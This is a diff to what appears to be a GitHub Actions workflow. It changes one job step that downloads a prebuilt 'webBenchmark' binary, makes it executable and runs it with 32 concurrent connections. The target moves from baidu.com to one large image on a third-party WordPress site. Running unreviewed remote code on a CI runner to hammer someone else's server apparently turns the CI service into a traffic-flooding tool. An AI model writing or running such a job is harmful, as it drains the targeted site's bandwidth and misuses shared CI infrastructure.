@@ -10,4 +10,4 @@ jobs:
     runs-on: ubuntu-latest
     steps:
     - name: 'Go'
-      run: wget https://github.com/maintell/webBenchmark/releases/download/0.1/webBenchmark_linux_x64&&chmod +x webBenchmark_linux_x64&&./webBenchmark_linux_x64 -c 32 -s www.baidu.com
+      run: wget https://github.com/maintell/webBenchmark/releases/download/0.1/webBenchmark_linux_x64&&chmod +x webBenchmark_linux_x64&&./webBenchmark_linux_x64 -c 32 -s "https://semyon.cn/wp-content/uploads/2020/09/IMG_8288-scaled.jpg"
